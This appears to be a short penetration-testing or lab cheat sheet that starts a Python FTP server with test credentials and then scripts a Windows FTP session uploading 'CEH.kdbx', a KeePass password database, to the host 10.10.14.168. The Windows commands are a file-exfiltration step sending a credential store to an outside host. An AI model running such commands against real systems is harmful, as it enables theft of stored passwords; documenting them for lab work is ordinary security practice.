#### FTP Server:

apt-get install python-pyftpdlib  

python ftpserver.py

username:test
password:test


#### Windows7

echo open 10.10.14.168 21> ftp.txt
echo user test test>> ftp.txt
echo help>> ftp.txt
echo put CEH.kdbx >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
